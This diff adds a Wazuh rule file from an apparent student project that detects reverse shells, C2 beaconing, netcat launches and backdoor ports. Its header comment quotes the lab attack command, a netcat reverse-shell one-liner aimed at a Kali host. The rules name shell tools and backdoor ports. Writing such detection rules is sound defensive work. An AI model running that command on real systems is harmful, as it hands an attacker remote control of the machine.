@@ -1,0 +1,133 @@
+<!--
+  ============================================================
+  Rule File : reverse_shell.xml
+  Author    : Teffat Abderahim
+  Project   : Smart Threat Detection with Wazuh and AI
+  Team      : ESI Sidi Bel Abbes — CyS 2SC — 2025/2026
+  MITRE     : T1059.004 — Command and Scripting: Unix Shell
+              T1071.001 — Application Layer Protocol: Web Protocols
+  Tactic    : Execution, Command and Control
+  IDs       : 100075–100079
+  Attack    : nc -e /bin/bash 192.168.109.158 4444
+  ============================================================
+
+  Detection Logic:
+  A reverse shell opens an outbound TCP connection from the victim
+  to the attacker, then pipes stdin/stdout through that connection.
+  The attacker receives a fully interactive shell.
+
+  Key signature: an interactive shell process (cmd.exe, powershell,
+  bash, sh) makes an OUTBOUND network connection. Normal shell
+  processes don't initiate network connections — they receive
+  keyboard input locally. Any outbound TCP from a shell process
+  is immediately suspicious.
+
+  Sysmon Event ID 3 (NetworkConnect) captures:
+    - SourceImage: the process making the connection
+    - DestinationIp: where it is connecting
+    - DestinationPort: which port
+    - Initiated: true (outbound)
+
+  We escalate based on:
+  1. Shell process connecting outbound (broad catch)
+  2. Connection to known Kali IP (confirmed attack)
+  3. Connection on unusual/backdoor ports (4444, 1234, 9001, etc.)
+  4. Netcat or similar tool process creation
+-->
+
+<group name="reverse_shell,c2,command_control,execution,windows">
+
+  <!--
+    RULE 100075 — Sysmon ID 3: shell process outbound connection
+    Logic : Any interactive shell making a network connection.
+            PowerShell making outbound connections is covered by
+            our download cradle rule (100021) — this catches raw
+            cmd.exe, bash.exe, and sh.exe specifically.
+    Level : 12
+  -->
+  <rule id="100075" level="12">
+    <if_group>windows</if_group>
+    <field name="win.system.eventID">^3$</field>
+    <match>(?i)(cmd\.exe|powershell\.exe|bash\.exe|sh\.exe|wsl\.exe)</match>
+    <match>Initiated: true</match>
+    <description>Reverse Shell Indicator: $(win.eventdata.image) initiated outbound TCP connection to $(win.eventdata.destinationIp):$(win.eventdata.destinationPort)</description>
+    <mitre>
+      <id>T1059.004</id>
+      <id>T1071.001</id>
+    </mitre>
+    <group>reverse_shell,shell_network_connection</group>
+  </rule>
+
+  <!--
+    RULE 100076 — Confirmed: shell connecting to Kali IP
+    Logic : Source process is a shell AND destination is the
+            known Kali attacker machine. Confirmed C2 channel.
+    Level : 15
+  -->
+  <rule id="100076" level="15">
+    <if_matched_sid>100075</if_matched_sid>
+    <match>192.168.109.158</match>
+    <description>Reverse Shell CONFIRMED: $(win.eventdata.image) connected to Kali attacker 192.168.109.158:$(win.eventdata.destinationPort) — active C2 channel</description>
+    <mitre>
+      <id>T1059.004</id>
+      <id>T1071.001</id>
+    </mitre>
+    <group>reverse_shell,c2_confirmed,critical_severity</group>
+  </rule>
+
+  <!--
+    RULE 100077 — Sysmon ID 3: connection on common backdoor ports
+    Logic : Common reverse shell listener ports: 4444 (Metasploit
+            default), 4445, 1234, 9001, 8080 (when used as C2),
+            31337, 5555. Any shell connecting on these is suspicious.
+    Level : 13
+  -->
+  <rule id="100077" level="13">
+    <if_matched_sid>100075</if_matched_sid>
+    <match>(?i)(DestinationPort: 4444|DestinationPort: 4445|DestinationPort: 1234|DestinationPort: 9001|DestinationPort: 31337|DestinationPort: 5555)</match>
+    <description>Reverse Shell on Known Backdoor Port: $(win.eventdata.image) → $(win.eventdata.destinationIp):$(win.eventdata.destinationPort) — Metasploit/Netcat default port</description>
+    <mitre>
+      <id>T1059.004</id>
+    </mitre>
+    <group>reverse_shell,backdoor_port,high_severity</group>
+  </rule>
+
+  <!--
+    RULE 100078 — Sysmon ID 1: netcat process creation
+    Logic : nc.exe or ncat.exe being launched is suspicious on
+            Windows — it is not a native Windows tool. Any use
+            of netcat should be investigated.
+    Level : 12
+  -->
+  <rule id="100078" level="12">
+    <if_group>windows</if_group>
+    <field name="win.system.eventID">^1$</field>
+    <match>(?i)(\\nc\.exe|\\ncat\.exe|\\netcat\.exe)</match>
+    <description>Netcat Executed: $(win.eventdata.image) launched — $(win.eventdata.commandLine) — possible reverse shell setup</description>
+    <mitre>
+      <id>T1059.004</id>
+      <id>T1105</id>
+    </mitre>
+    <group>reverse_shell,netcat,suspicious_tool</group>
+  </rule>
+
+  <!--
+    RULE 100079 — Sysmon ID 3: repeated beaconing pattern
+    Logic : C2 agents beacon regularly (every N seconds). This
+            rule fires when the same process makes 5+ outbound
+            connections to the same IP in 120 seconds.
+            That regularity is a C2 beacon signature.
+    Level : 13
+  -->
+  <rule id="100079" level="13" frequency="5" timeframe="120">
+    <if_matched_sid>100075</if_matched_sid>
+    <same_source_ip />
+    <description>C2 Beacon Pattern: $(win.eventdata.image) made $(frequency) outbound connections in $(timeframe)s — automated C2 callback detected</description>
+    <mitre>
+      <id>T1071.001</id>
+      <id>T1059.004</id>
+    </mitre>
+    <group>reverse_shell,c2_beacon,high_severity</group>
+  </rule>
+
+</group>
